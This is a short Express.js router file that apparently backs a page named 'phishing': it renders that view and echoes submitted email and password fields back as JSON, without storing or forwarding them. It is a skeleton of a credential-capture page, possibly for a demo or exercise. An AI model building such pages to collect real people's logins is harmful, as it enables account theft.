const express = require('express'), router = express.Router()

router.get("/", (req, res) => {

   res.render("phishing/phishing")
})

router.post("/", (req, res) => {
   const name = req.body.email
   const pass = req.body.password

   res.send({name: name, password: pass})
})

module.exports = router
